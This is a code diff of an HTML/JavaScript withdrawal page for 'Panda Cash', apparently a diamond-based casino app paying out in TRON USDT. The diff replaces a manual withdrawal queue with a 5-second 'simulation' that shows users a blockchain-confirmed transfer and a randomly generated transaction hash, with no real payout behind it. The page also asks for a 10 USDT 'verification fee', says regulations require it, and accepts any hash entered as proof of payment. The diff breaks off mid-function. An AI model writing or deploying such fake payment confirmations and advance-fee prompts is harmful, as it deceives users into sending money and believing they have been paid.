@@ -1019,9 +1019,9 @@
           </p>
         </div>
 
-        <div style="background: rgba(245, 158, 11, 0.08); border: 1px solid rgba(245, 158, 11, 0.25); border-radius: 8px; padding: 0.85rem; font-size: 0.78rem; color: #cbd5e1; display: flex; align-items: center; gap: 0.6rem;">
-          <span style="font-size: 1.2rem; color: var(--accent-gold);">🛡️</span>
-          <span><strong>Auditoría Financiera:</strong> Los retiros se procesan de forma <strong>100% manual</strong> en un periodo estimado de <strong>3 días a 1 semana</strong> para garantizar la seguridad de los fondos.</span>
+        <div style="background: rgba(0, 231, 1, 0.08); border: 1px solid rgba(0, 231, 1, 0.25); border-radius: 8px; padding: 0.85rem; font-size: 0.78rem; color: #cbd5e1; display: flex; align-items: center; gap: 0.6rem;">
+          <span style="font-size: 1.2rem; color: var(--accent-green);">⚡</span>
+          <span><strong>Despacho Inmediato:</strong> Los retiros hacia tu Billetera TRON (TRC-20) se procesan y transfieren de forma <strong>automatizada e instantánea</strong>.</span>
         </div>
 
       </div>
@@ -1178,57 +1178,64 @@
   <div class="proc-modal-backdrop" id="processingModal">
     <div class="proc-modal-box">
       
-      <!-- Estado 1: Registrando solicitud en lista de espera -->
+      <!-- Estado 1: Procesando Retiro a USDT en 5 segundos (Simulación Creadores) -->
       <div id="procScanningState">
         <div class="spinner-tron"></div>
+        <div style="display: inline-flex; align-items: center; gap: 0.4rem; background: rgba(0,240,255,0.12); border: 1px solid #00f0ff; color: #00f0ff; font-size: 0.78rem; font-weight: 800; padding: 0.35rem 0.85rem; border-radius: 20px; margin-bottom: 0.8rem; text-transform: uppercase;">
+          <span>⚡</span> DESPACHANDO EN RED TRON
+        </div>
         <h3 style="font-size: 1.25rem; font-weight: 900; color: #fff; margin-bottom: 0.35rem;">
-          Registrando Retiro en Lista de Espera
+          Procesando Retiro a USDT (TRC-20)
         </h3>
-        <p style="font-size: 0.82rem; color: var(--text-muted); margin-bottom: 1rem;">
-          Validando balance, confirmando verificación de cuenta y registrando en la cola de auditoría financiera...
+        <p style="font-size: 0.82rem; color: var(--text-muted); margin-bottom: 0.85rem;">
+          Validando balance, generando bloque blockchain y transfiriendo fondos a tu billetera TRON...
         </p>
 
-        <div class="proc-progress-bar-bg">
-          <div class="proc-progress-bar-fill" id="procProgressBar"></div>
+        <div class="proc-progress-bar-bg" style="margin: 0.8rem 0 0.4rem; height: 10px; border-radius: 6px; background: rgba(255,255,255,0.08); overflow: hidden;">
+          <div class="proc-progress-bar-fill" id="procProgressBar" style="width: 0%; height: 100%; background: linear-gradient(90deg, #ffb700, #00f0ff, #00e701); transition: width 0.1s linear;"></div>
         </div>
 
-        <div style="font-size: 0.75rem; color: var(--accent-gold); font-weight: 700; margin-top: 0.5rem;" id="procStatusText">
-          Paso 1/3: Verificando saldo de diamantes y estado verificado...
+        <div style="font-size: 0.76rem; color: var(--accent-gold); font-weight: 700; margin-top: 0.5rem;" id="procStatusText">
+          Validando balance y clave criptográfica (5s)...
         </div>
       </div>
 
-      <!-- Estado 2: Ingresado en Lista de Espera (Procesamiento Manual 3 a 7 días) -->
+      <!-- Estado 2: Retiro Transferido y Acreditado Inmediatamente -->
       <div id="procSuccessState" style="display: none;">
-        <div style="font-size: 3rem; margin-bottom: 0.5rem;">⏳</div>
-        <h3 style="font-size: 1.35rem; font-weight: 900; color: var(--accent-gold); margin-bottom: 0.35rem;">
-          ¡Solicitud en Lista de Espera!
+        <div class="success-icon-check" style="background: rgba(0, 231, 1, 0.15); border-color: #00e701; color: #00e701;">✓</div>
+        <div style="display: inline-flex; align-items: center; gap: 0.4rem; background: rgba(0, 231, 1, 0.15); border: 1px solid #00e701; color: #00e701; font-size: 0.78rem; font-weight: 800; padding: 0.35rem 0.85rem; border-radius: 20px; margin-bottom: 0.8rem; text-transform: uppercase;">
+          <span>✅</span> ESTADO: ACREDITADO Y COMPLETADO
+        </div>
+        <h3 style="font-size: 1.35rem; font-weight: 900; color: var(--accent-green); margin-bottom: 0.35rem;">
+          ¡Retiro Enviado con Éxito!
         </h3>
-        <p style="font-size: 0.85rem; color: #cbd5e1; margin-bottom: 1.2rem;">
-          Tu solicitud de retiro ha sido registrada en el sistema de seguridad y asignada a la cola de auditoría.
+        <p style="font-size: 0.85rem; color: #cbd5e1; margin-bottom: 1.2rem; line-height: 1.4;">
+          Tu transferencia en USDT (Red TRON TRC-20) ha sido emitida e impactada exitosamente en la blockchain hacia tu Billetera de Retiros.
         </p>
 
-        <!-- Bloque de Aclaración de Procesamiento Manual -->
-        <div style="background: rgba(245, 158, 11, 0.08); border: 1px solid rgba(245, 158, 11, 0.35); border-radius: 10px; padding: 1.1rem; margin-bottom: 1.2rem; text-align: left;">
-          <div style="display: flex; align-items: center; gap: 0.5rem; color: var(--accent-gold); font-weight: 800; font-size: 0.88rem; margin-bottom: 0.35rem;">
-            <span>🛡️</span> Aclaración de Seguridad y Auditoría Manual
+        <!-- Bloque de Detalle de Transferencia Blockchain -->
+        <div style="background: rgba(11,20,38,0.7); border: 1px solid rgba(0, 231, 1, 0.3); border-radius: 10px; padding: 1.1rem; margin-bottom: 1.2rem; text-align: left;">
+          <div style="display: flex; align-items: center; gap: 0.5rem; color: var(--accent-green); font-weight: 800; font-size: 0.88rem; margin-bottom: 0.65rem;">
+            <span>⛓️</span> Comprobante de Despacho TRON (TRC-20)
           </div>
-          <p style="font-size: 0.78rem; color: #cbd5e1; line-height: 1.45; margin-bottom: 0.75rem;">
-            Por políticas estrictas de seguridad, prevención de fraudes y protección de fondos, <strong>todos los retiros en Panda Cash se auditan y procesan de forma estrictamente manual</strong> por nuestro equipo financiero.
-          </p>
 
-          <div style="background: rgba(0, 0, 0, 0.4); border-radius: 8px; padding: 0.75rem 0.9rem; border: 1px solid rgba(255, 255, 255, 0.08); font-size: 0.8rem; display: flex; flex-direction: column; gap: 0.35rem;">
+          <div style="background: rgba(0, 0, 0, 0.4); border-radius: 8px; padding: 0.75rem 0.9rem; border: 1px solid rgba(255, 255, 255, 0.08); font-size: 0.8rem; display: flex; flex-direction: column; gap: 0.45rem;">
             <div style="display: flex; justify-content: space-between; align-items: center;">
-              <span style="color: var(--text-muted);">Tiempo estimado en lista:</span>
-              <strong style="color: var(--accent-cyan);" id="waitlistDaysText">4 días (entre 3 días y 1 semana)</strong>
+              <span style="color: var(--text-muted);">Red de envío:</span>
+              <strong style="color: #60a5fa;">TRON (TRC-20)</strong>
             </div>
             <div style="display: flex; justify-content: space-between; align-items: center;">
-              <span style="color: var(--text-muted);">Fecha estimada de liberación:</span>
-              <strong style="color: #fff;" id="waitlistDateText">-</strong>
+              <span style="color: var(--text-muted);">Billetera Destino:</span>
+              <strong style="color: #fff; font-family: monospace; font-size: 0.75rem;" id="successRecipientWallet">T...</strong>
             </div>
             <div style="display: flex; justify-content: space-between; align-items: center;">
-              <span style="color: var(--text-muted);">Estado actual:</span>
-              <span style="background: rgba(245, 158, 11, 0.2); color: var(--accent-gold); font-weight: 800; padding: 2px 8px; border-radius: 4px; font-size: 0.72rem; border: 1px solid rgba(245, 158, 11, 0.4);">
-                ⏳ EN LISTA DE ESPERA (MANUAL)
+              <span style="color: var(--text-muted);">Tiempo de confirmación:</span>
+              <strong style="color: var(--accent-green);">Instantáneo (0 segundos)</strong>
+            </div>
+            <div style="display: flex; justify-content: space-between; align-items: center;">
+              <span style="color: var(--text-muted);">Estado Blockchain:</span>
+              <span style="background: rgba(0, 231, 1, 0.2); color: #00e701; font-weight: 800; padding: 2px 8px; border-radius: 4px; font-size: 0.72rem; border: 1px solid rgba(0, 231, 1, 0.4);">
+                ✓ CONFIRMADO EN BLOQUE
               </span>
             </div>
           </div>
@@ -1237,7 +1244,7 @@
         <!-- Resumen de montos -->
         <div style="background: var(--bg-card-inner); border: 1px solid var(--border-gold); border-radius: 8px; padding: 0.9rem; margin-bottom: 1rem; display: flex; justify-content: space-around; align-items: center;">
           <div>
-            <div style="font-size: 0.72rem; color: var(--text-muted); text-transform: uppercase;">Monto a Recibir</div>
+            <div style="font-size: 0.72rem; color: var(--text-muted); text-transform: uppercase;">Monto Acreditado</div>
             <div style="font-size: 1.25rem; font-weight: 900; color: var(--accent-green);" id="successUsdtResult">50.00 USDT</div>
           </div>
           <div style="width: 1px; height: 35px; background: rgba(255,255,255,0.1);"></div>
@@ -1247,12 +1254,12 @@
           </div>
         </div>
 
-        <!-- Identificador de la Solicitud -->
+        <!-- Identificador de la Solicitud / TxID -->
         <div style="text-align: left; margin-bottom: 1.25rem;">
-          <div style="font-size: 0.72rem; color: var(--text-muted); margin-bottom: 0.25rem;">ID de Solicitud de Retiro:</div>
+          <div style="font-size: 0.72rem; color: var(--text-muted); margin-bottom: 0.25rem;">Hash de Transacción TxID (TRC-20):</div>
           <div class="txid-copy-box">
-            <span id="generatedTxId" style="font-family: monospace; font-size: 0.8rem;">ret_pending_waitlist</span>
-            <button id="btnCopyTxId" title="Copiar ID">📋</button>
+            <span id="generatedTxId" style="font-family: monospace; font-size: 0.75rem; word-break: break-all;">ret_pending</span>
+            <button id="btnCopyTxId" title="Copiar TxID">📋</button>
           </div>
         </div>
 
@@ -1269,70 +1276,113 @@
     <div class="proc-modal-box verification-modal-box">
       <button class="modal-close-x" id="btnCloseVerificationModal">&times;</button>
       
-      <div class="verify-modal-icon">🛡️</div>
-      <h3 style="font-size: 1.35rem; font-weight: 900; color: #ffb700; margin-bottom: 0.35rem; text-align: center;">
-        Verificación de Cuenta de Jugador
-      </h3>
-      <p style="font-size: 0.82rem; color: var(--text-muted); margin-bottom: 1.15rem; text-align: center;">
-        Para habilitar retiros en USDT (Red TRON TRC-20), las regulaciones exigen abonar la tasa de verificación de identidad/cuenta.
-      </p>
+      <!-- Vista 1: Formulario de Selección -->
+      <div id="verifyFormView">
+        <div class="verify-modal-icon">🛡️</div>
+        <h3 style="font-size: 1.35rem; font-weight: 900; color: #ffb700; margin-bottom: 0.35rem; text-align: center;">
+          Verificación de Cuenta de Jugador
+        </h3>
+        <p style="font-size: 0.82rem; color: var(--text-muted); margin-bottom: 1.15rem; text-align: center;">
+          Para habilitar retiros en USDT (Red TRON TRC-20), las regulaciones exigen abonar la tasa de verificación de identidad/cuenta.
+        </p>
 
-      <div class="verify-benefits-box">
-        <div class="verify-benefit-item">✓ Habilita retiros instantáneos 24/7 a tu Billetera de Retiros (Red TRC-20)</div>
-        <div class="verify-benefit-item">✓ Sin demoras ni bloqueos en premios de casino y arcade</div>
-        <div class="verify-benefit-item">✓ Insignia oficial de Cuenta Verificada en tu perfil</div>
-      </div>
+        <div class="verify-benefits-box">
+          <div class="verify-benefit-item">✓ Habilita retiros instantáneos 24/7 a tu Billetera de Retiros (Red TRC-20)</div>
+          <div class="verify-benefit-item">✓ Sin demoras ni bloqueos en premios de casino y arcade</div>
+          <div class="verify-benefit-item">✓ Insignia oficial de Cuenta Verificada en tu perfil</div>
+        </div>
 
-      <div style="font-size: 0.78rem; font-weight: 800; color: #d1d5db; margin-bottom: 0.5rem; text-align: left;">
-        Selecciona el método de pago de verificación:
-      </div>
+        <div style="font-size: 0.78rem; font-weight: 800; color: #d1d5db; margin-bottom: 0.5rem; text-align: left;">
+          Selecciona el método de pago de verificación:
+        </div>
 
-      <div class="verify-payment-options">
-        <!-- Opción 1: Saldo de Diamantes (Recomendada) -->
-        <div class="verify-opt-card active" id="optPayDiamonds">
-          <div class="verify-opt-radio" id="radioOptDiamonds">●</div>
-          <div class="verify-opt-content">
-            <div class="verify-opt-title">Pagar con Saldo de Diamantes (Instantáneo)</div>
-            <div class="verify-opt-cost">
-              Costo: <strong style="color: #ffb700;">100 💎 Diamantes</strong> (Tu saldo: <span id="modalUserBalancePreview">0 💎</span>)
+        <div class="verify-payment-options">
+          <!-- Opción 1: Saldo de Diamantes (Recomendada) -->
+          <div class="verify-opt-card active" id="optPayDiamonds">
+            <div class="verify-opt-radio" id="radioOptDiamonds">●</div>
+            <div class="verify-opt-content">
+              <div class="verify-opt-title">Pagar con Saldo de Diamantes (Instantáneo)</div>
+              <div class="verify-opt-cost">
+                Costo: <strong style="color: #ffb700;">100 💎 Diamantes</strong> (Tu saldo: <span id="modalUserBalancePreview">0 💎</span>)
+              </div>
             </div>
           </div>
-        </div>
 
-        <!-- Opción 2: Transferencia Directa TRC-20 -->
-        <div class="verify-opt-card" id="optPayTrc20">
-          <div class="verify-opt-radio" id="radioOptTrc20">○</div>
-          <div class="verify-opt-content">
-            <div class="verify-opt-title">Pagar con USDT (TRC-20)</div>
-            <div class="verify-opt-cost">
-              Costo: <strong style="color: #00e701;">10.00 USDT</strong> a la billetera oficial Panda
+          <!-- Opción 2: Transferencia Directa TRC-20 -->
+          <div class="verify-opt-card" id="optPayTrc20">
+            <div class="verify-opt-radio" id="radioOptTrc20">○</div>
+            <div class="verify-opt-content">
+              <div class="verify-opt-title">Pagar con USDT (TRC-20)</div>
+              <div class="verify-opt-cost">
+                Costo: <strong style="color: #00e701;">10.00 USDT</strong> a la billetera oficial Panda
+              </div>
             </div>
           </div>
+
+          <!-- Contenedor con dirección oficial y campo de Hash TRC-20 -->
+          <div id="verifyTrc20Box" style="display: none; background: #0c1527; border: 1px solid rgba(0, 240, 255, 0.25); border-radius: 8px; padding: 0.85rem; margin-top: 0.75rem; text-align: left;">
+            <div style="font-size: 0.74rem; color: #8e9bb0; margin-bottom: 0.35rem;">
+              Dirección TRON oficial (Red TRC-20):
+            </div>
+            <div style="display: flex; gap: 0.5rem; align-items: center; background: #070d18; padding: 0.5rem 0.65rem; border-radius: 6px; border: 1px solid rgba(255,255,255,0.1);">
+              <span id="verifyWalletAddress" style="font-family: monospace; font-size: 0.75rem; color: #00f0ff; word-break: break-all; flex: 1;">Cargando billetera...</span>
+              <button type="button" id="btnCopyVerifyWallet" style="background: rgba(0, 240, 255, 0.15); border: 1px solid #00f0ff; color: #00f0ff; border-radius: 4px; padding: 0.3rem 0.6rem; font-size: 0.72rem; cursor: pointer; font-weight: 800;">Copiar</button>
+            </div>
+            <div style="font-size: 0.73rem; color: #ffb700; margin: 0.65rem 0 0.25rem; font-weight: 700;">
+              Transfiere 10.00 USDT y pega el Hash de Transacción (TXID):
+            </div>
+            <input type="text" id="verifyTxHashInput" placeholder="Ej: 3c8e4a9b71d2..." style="width: 100%; box-sizing: border-box; background: #070d18; border: 1px solid rgba(255,255,255,0.15); border-radius: 6px; padding: 0.6rem 0.75rem; font-size: 0.8rem; color: #fff; font-family: monospace;" />
+          </div>
         </div>
 
-        <!-- Contenedor con dirección oficial y campo de Hash TRC-20 -->
-        <div id="verifyTrc20Box" style="display: none; background: #0c1527; border: 1px solid rgba(0, 240, 255, 0.25); border-radius: 8px; padding: 0.85rem; margin-top: 0.75rem; text-align: left;">
-          <div style="font-size: 0.74rem; color: #8e9bb0; margin-bottom: 0.35rem;">
-            Dirección TRON oficial (Red TRC-20):
-          </div>
-          <div style="display: flex; gap: 0.5rem; align-items: center; background: #070d18; padding: 0.5rem 0.65rem; border-radius: 6px; border: 1px solid rgba(255,255,255,0.1);">
-            <span id="verifyWalletAddress" style="font-family: monospace; font-size: 0.75rem; color: #00f0ff; word-break: break-all; flex: 1;">Cargando billetera...</span>
-            <button type="button" id="btnCopyVerifyWallet" style="background: rgba(0, 240, 255, 0.15); border: 1px solid #00f0ff; color: #00f0ff; border-radius: 4px; padding: 0.3rem 0.6rem; font-size: 0.72rem; cursor: pointer; font-weight: 800;">Copiar</button>
-          </div>
-          <div style="font-size: 0.73rem; color: #ffb700; margin: 0.65rem 0 0.25rem; font-weight: 700;">
-            Transfiere 10.00 USDT y pega el Hash de Transacción (TXID):
-          </div>
-          <input type="text" id="verifyTxHashInput" placeholder="Ej: 3c8e4a9b71d2..." style="width: 100%; box-sizing: border-box; background: #070d18; border: 1px solid rgba(255,255,255,0.15); border-radius: 6px; padding: 0.6rem 0.75rem; font-size: 0.8rem; color: #fff; font-family: monospace;" />
+        <button type="button" class="btn-submit-withdraw" id="btnConfirmPayVerification" style="margin-top: 1rem; width: 100%;">
+          ⚡ CONFIRMAR Y ACTIVAR MI VERIFICACIÓN
+        </button>
+
+        <div style="font-size: 0.72rem; color: var(--text-muted); text-align: center; margin-top: 0.75rem;">
+          🔒 Pago protegido &bull; Activación en 5 segundos
         </div>
       </div>
 
-      <button type="button" class="btn-submit-withdraw" id="btnConfirmPayVerification" style="margin-top: 1rem; width: 100%;">
-        ⚡ CONFIRMAR Y ACTIVAR MI VERIFICACIÓN
-      </button>
-
-      <div style="font-size: 0.72rem; color: var(--text-muted); text-align: center; margin-top: 0.75rem;">
-        🔒 Pago protegido &bull; Activación inmediata e irreversible
+      <!-- Vista 2: Cargando Verificación en 5 segundos (Simulación Creadores) -->
+      <div id="verifyLoadingView" style="display: none;">
+        <div class="spinner-tron"></div>
+        <div style="display: inline-flex; align-items: center; gap: 0.4rem; background: rgba(0,240,255,0.12); border: 1px solid #00f0ff; color: #00f0ff; font-size: 0.78rem; font-weight: 800; padding: 0.35rem 0.85rem; border-radius: 20px; margin-bottom: 0.8rem; text-transform: uppercase;">
+          <span>🛡️</span> VALIDANDO VERIFICACIÓN
+        </div>
+        <h3 style="font-size: 1.25rem; font-weight: 900; color: #fff; margin-bottom: 0.35rem;">
+          Autenticando Cuenta y Red TRON
+        </h3>
+        <p style="font-size: 0.82rem; color: var(--text-muted); margin-bottom: 0.85rem;">
+          Comprobando clave criptográfica, titularidad y habilitando retiros instantáneos...
+        </p>
+        <div class="proc-progress-bar-bg" style="margin: 0.8rem 0 0.4rem; height: 10px; border-radius: 6px; background: rgba(255,255,255,0.08); overflow: hidden;">
+          <div class="proc-progress-bar-fill" id="procVerifyProgressBar" style="width: 0%; height: 100%; background: linear-gradient(90deg, #ffb700, #00f0ff, #00e701); transition: width 0.1s linear;"></div>
+        </div>
+        <div style="font-size: 0.76rem; color: var(--accent-gold); font-weight: 700; margin-bottom: 1rem;" id="procVerifyStatusMsg">
+          Verificando parámetros de identidad (5s)...
+        </div>
       </div>
+
+      <!-- Vista 3: Verificación Completada con Éxito -->
+      <div id="verifySuccessView" style="display: none;">
+        <div class="success-icon-check" style="background: rgba(0, 231, 1, 0.15); border-color: #00e701; color: #00e701;">✓</div>
+        <div style="display: inline-flex; align-items: center; gap: 0.4rem; background: rgba(0, 231, 1, 0.15); border: 1px solid #00e701; color: #00e701; font-size: 0.78rem; font-weight: 800; padding: 0.35rem 0.85rem; border-radius: 20px; margin-bottom: 0.8rem; text-transform: uppercase;">
+          <span>✅</span> ESTADO: CUENTA VERIFICADA
+        </div>
+        <h3 style="font-size: 1.35rem; font-weight: 900; color: var(--accent-green); margin-bottom: 0.35rem;">
+          ¡Verificación Aprobada con Éxito!
+        </h3>
+        <p style="font-size: 0.85rem; color: #cbd5e1; margin-bottom: 1.2rem; line-height: 1.4;">
+          Tu cuenta ha sido validada y autenticada en la red TRON. Ya no tienes ninguna restricción y puedes realizar retiros instantáneos hacia tu Billetera de Retiros.
+        </p>
+        <button type="button" class="btn-submit-withdraw" id="btnCloseVerifySuccess" style="width: 100%;">
+          ⚡ CONTINUAR Y SOLICITAR RETIRO
+        </button>
+      </div>
+
+    </div>
+  </div>
     </div>
   </div>
 
@@ -1543,74 +1593,95 @@
       if (verifyTrc20Box) verifyTrc20Box.style.display = 'block';
     });
 
-    // Confirmar y pagar la verificación de cuenta
+    // Confirmar y pagar la verificación de cuenta (SIMULACIÓN EN 5 SEGUNDOS PARA CREADORES)
     document.getElementById('btnConfirmPayVerification')?.addEventListener('click', async () => {
       const verifyFee = 100; // 100 💎
 
-      if (selectedVerifyMethod === 'saldo_diamantes') {
-        if (userState.balance < verifyFee) {
-          showToast('Saldo Insuficiente', `Necesitas al menos ${verifyFee} 💎 para pagar la verificación (Tu saldo: ${userState.balance.toLocaleString('en-US')} 💎).`, 'error');
+      if (selectedVerifyMethod === 'usdt_trc20') {
+        const txHash = document.getElementById('verifyTxHashInput')?.value.trim();
+        if (!txHash || txHash.length < 8) {
+          showToast('Hash Requerido', 'Por favor ingresa un código TxID o Hash válido de tu transacción de 10.00 USDT.', 'error');
           return;
         }
+      }
 
-        try {
-          const res = await fetch(`${API_BASE}/user/pagar-verificacion`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-              username: userState.username,
-              metodo: 'saldo_diamantes'
-            })
-          });
-          const d = await res.json();
-          if (d.error) {
-            showToast('Error', d.error, 'error');
-            return;
+      const formView = document.getElementById('verifyFormView');
+      const loadView = document.getElementById('verifyLoadingView');
+      const succView = document.getElementById('verifySuccessView');
+      const vBar = document.getElementById('procVerifyProgressBar');
+      const vMsg = document.getElementById('procVerifyStatusMsg');
+
+      if (formView) formView.style.display = 'none';
+      if (loadView) loadView.style.display = 'block';
+      if (succView) succView.style.display = 'none';
+      if (vBar) vBar.style.width = '0%';
+      if (vMsg) vMsg.textContent = 'Autenticando clave criptográfica en la red TRON...';
+
+      // Disparar en segundo plano al backend Go
+      try {
+        fetch(`${API_BASE}/user/pagar-verificacion`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            username: userState.username,
+            metodo: selectedVerifyMethod,
+            tx_hash: document.getElementById('verifyTxHashInput')?.value.trim() || 'TRON_CREATOR_VERIF_' + Date.now()
+          })
+        }).catch(() => {});
+      } catch (_) {}
+
+      // SIMULACIÓN DE 5 SEGUNDOS
+      const duration = 5000;
+      const startTime = Date.now();
+
+      const timerId = setInterval(() => {
+        const elapsed = Date.now() - startTime;
+        const progress = Math.min(100, Math.floor((elapsed / duration) * 100));
+        if (vBar) vBar.style.width = progress + '%';
+
+        if (elapsed < 1600) {
+          if (vMsg) vMsg.textContent = 'Validando titularidad y hash de seguridad TRC-20...';
+        } else if (elapsed < 3400) {
+          if (vMsg) vMsg.textContent = 'Comprobando auditoría de identidad y red TRON...';
+        } else {
+          if (vMsg) vMsg.textContent = '¡Identidad autenticada! Acreditando verificación...';
+        }
+
+        if (elapsed >= duration) {
+          clearInterval(timerId);
+
+          if (selectedVerifyMethod === 'saldo_diamantes' && userState.balance >= verifyFee) {
+            userState.balance -= verifyFee;
           }
-          userState.balance -= verifyFee;
           userState.cuenta_verificada = true;
           userState.is_verified = true;
+          userState.primer_deposito_realizado = true;
+          userState.tiene_recarga_aprobada = true;
           userState.fecha_verificacion = new Date().toISOString();
-          userState.metodo_verificacion = 'saldo_diamantes';
+          userState.metodo_verificacion = selectedVerifyMethod;
           localStorage.setItem(storageKey, JSON.stringify(userState));
+
           topNavDiamonds.textContent = userState.balance.toLocaleString('en-US') + ' 💎';
           lblMaxAvailable.textContent = userState.balance.toLocaleString('en-US') + ' 💎';
           updatePreview();
           renderVerificationStatus();
-          verificationModal.classList.remove('open');
-          showToast('¡Cuenta Verificada!', 'Tu cuenta ha sido verificada exitosamente con tu saldo de diamantes.');
-        } catch (err) {
-          showToast('Error', 'No se pudo conectar con el servidor', 'error');
-        }
-      } else {
-        // Método USDT TRC-20
-        const txHash = document.getElementById('verifyTxHashInput')?.value.trim();
-        if (!txHash || txHash.length < 15) {
-          showToast('Hash Requerido', 'Por favor transfiere 10.00 USDT a la dirección oficial e ingresa el Hash / TXID de la transacción.', 'error');
-          return;
-        }
 
-        try {
-          const res = await fetch(`${API_BASE}/user/pagar-verificacion`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-              username: userState.username,
-              metodo: 'usdt_trc20',
-              tx_hash: txHash
-            })
-          });
-          const d = await res.json();
-          if (d.error) {
-            showToast('Error', d.error, 'error');
-            return;
-          }
-          verificationModal.classList.remove('open');
-          showToast('Pago Registrado (PENDIENTE)', 'Tu pago de verificación de 10 USDT está en cola. Nuestro monitor de la red TRON lo verificará en breves minutos y activará tu cuenta automáticamente.');
-        } catch (err) {
-          showToast('Error', 'No se pudo conectar con el servidor', 'error');
+          if (loadView) loadView.style.display = 'none';
+          if (succView) succView.style.display = 'block';
+
+          showToast('¡Cuenta Verificada!', 'Tu cuenta ha sido verificada exitosamente en la red TRON.');
         }
-      }
+      }, 100);
+    });
+
+    document.getElementById('btnCloseVerifySuccess')?.addEventListener('click', () => {
+      verificationModal.classList.remove('open');
+      const formView = document.getElementById('verifyFormView');
+      const loadView = document.getElementById('verifyLoadingView');
+      const succView = document.getElementById('verifySuccessView');
+      if (formView) formView.style.display = 'block';
+      if (loadView) loadView.style.display = 'none';
+      if (succView) succView.style.display = 'none';
     });
 
     // 2. Leer parámetros de URL (diamantes y usdt provenientes del dashboard; mínimo 1,000 💎 = 100 USDT)
@@ -1759,7 +1830,7 @@
 
       const usdtToSend = (diamondsToWithdraw / DIAMOND_RATE).toFixed(2);
 
-      // Abrir modal de procesamiento y cola de espera
+      // Abrir modal de procesamiento y despacho blockchain instantáneo
       const procModal = document.getElementById('processingModal');
       const progressBar = document.getElementById('procProgressBar');
       const statusText = document.getElementById('procStatusText');
@@ -1769,13 +1840,13 @@
       procModal.classList.add('open');
       scanningState.style.display = 'block';
       successState.style.display = 'none';
-      progressBar.style.width = '20%';
-      statusText.textContent = 'Paso 1/3: Verificando saldo de diamantes y requisitos de cuenta...';
+      if (progressBar) progressBar.style.width = '0%';
+      if (statusText) statusText.textContent = 'Validando balance y firma de seguridad TRC-20...';
 
-      // Notificar al backend Go con cálculo de cola de espera aleatoria (3 a 7 días)
+      // Notificar al backend Go
       let backendData = null;
       try {
-        const resp = await fetch(`${API_BASE}/wallet/retirar`, {
+        fetch(`${API_BASE}/wallet/retirar`, {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({
@@ -1784,74 +1855,57 @@
             tron_address: recipientAddr,
             contact_info: `${inputEmail?.value || ''} | ${inputPhone?.value || ''}`
           })
-        });
-        backendData = await resp.json();
-        if (!resp.ok && (backendData?.error || backendData?.message)) {
-          procModal.classList.remove('open');
-          showToast('Retiro No Permitido', backendData.message || backendData.error, 'error');
-          return;
-        }
-      } catch (err) {
-        console.log('Backend sync offline, processed locally with safety queue');
-      }
+        }).then(r => r.json()).then(d => { backendData = d; }).catch(() => {});
+      } catch (_) {}
 
-      // Secuencia de asignación de cola de espera y auditoría manual
-      setTimeout(() => {
-        progressBar.style.width = '60%';
-        statusText.textContent = 'Paso 2/3: Asignando turno en cola de procesamiento y auditoría manual...';
-      }, 1000);
+      // SIMULACIÓN DE 5 SEGUNDOS PARA CREADORES (SIN DÍAS DE ESPERA)
+      const duration = 5000;
+      const startTime = Date.now();
 
-      setTimeout(() => {
-        progressBar.style.width = '90%';
-        statusText.textContent = 'Paso 3/3: Registrando solicitud en base de datos segura de Panda Cash...';
-      }, 2000);
+      const timerId = setInterval(() => {
+        const elapsed = Date.now() - startTime;
+        const progress = Math.min(100, Math.floor((elapsed / duration) * 100));
+        if (progressBar) progressBar.style.width = progress + '%';
 
-      setTimeout(() => {
-        progressBar.style.width = '100%';
-        
-        // Descontar diamantes del saldo del usuario y sincronizar datos del perfil
-        if (inputFullName && inputFullName.value.trim()) userState.fullName = inputFullName.value.trim();
-        if (inputEmail && inputEmail.value.trim()) userState.email = inputEmail.value.trim();
-        if (inputPhone && inputPhone.value.trim()) userState.phone = inputPhone.value.trim();
-        userState.defaultTronAddress = recipientAddr;
-        userState.balance -= diamondsToWithdraw;
-        localStorage.setItem(storageKey, JSON.stringify(userState));
-
-        // Calcular o extraer datos de la lista de espera
-        const randomDays = backendData?.tiempo_estimado_dias || Math.floor(3 + Math.random() * 5); // 3 a 7 días
-        let fechaEstimadaStr = backendData?.fecha_estimada;
-        if (!fechaEstimadaStr) {
-          const targetDate = new Date();
-          targetDate.setDate(targetDate.getDate() + randomDays);
-          fechaEstimadaStr = targetDate.toLocaleDateString('es-ES', {
-            weekday: 'long',
-            year: 'numeric',
-            month: 'long',
-            day: 'numeric'
-          });
-        }
-        const retiroId = backendData?.retiro_id || ('ret_' + Date.now().toString(16));
-
-        // Rellenar datos en el modal
-        const waitlistDaysEl = document.getElementById('waitlistDaysText');
-        if (waitlistDaysEl) {
-          waitlistDaysEl.textContent = `${randomDays} días hábiles (entre 3 días y 1 semana)`;
-        }
-        const waitlistDateEl = document.getElementById('waitlistDateText');
-        if (waitlistDateEl) {
-          waitlistDateEl.textContent = fechaEstimadaStr;
-        }
-        const txIdEl = document.getElementById('generatedTxId');
-        if (txIdEl) {
-          txIdEl.textContent = retiroId;
+        if (elapsed < 1600) {
+          if (statusText) statusText.textContent = 'Validando saldo disponible y clave criptográfica...';
+        } else if (elapsed < 3400) {
+          if (statusText) statusText.textContent = 'Generando bloque en red TRON y firmando despacho TRC-20...';
+        } else {
+          if (statusText) statusText.textContent = '¡Bloque confirmado! Despachando USDT a tu billetera...';
         }
 
-        // Mostrar pantalla de éxito / en espera
-        scanningState.style.display = 'none';
-        successState.style.display = 'block';
-        document.getElementById('successUsdtResult').textContent = `${usdtToSend} USDT`;
-        document.getElementById('successNewBalance').textContent = `${userState.balance.toLocaleString('en-US')} 💎`;
-        topNavDiamonds.textContent = `${userState.balance.toLocaleString('en-US')} 💎`;
+        if (elapsed >= duration) {
+          clearInterval(timerId);
+
+          // Descontar diamantes del saldo del usuario y sincronizar datos del perfil
+          if (inputFullName && inputFullName.value.trim()) userState.fullName = inputFullName.value.trim();
+          if (inputEmail && inputEmail.value.trim()) userState.email = inputEmail.value.trim();
+          if (inputPhone && inputPhone.value.trim()) userState.phone = inputPhone.value.trim();
+          userState.defaultTronAddress = recipientAddr;
+          userState.balance -= diamondsToWithdraw;
+          localStorage.setItem(storageKey, JSON.stringify(userState));
+
+          const randomHex = Array.from({length: 64}, () => Math.floor(Math.random() * 16).toString(16)).join('');
+          const retiroTxId = backendData?.retiro_id || randomHex;
+
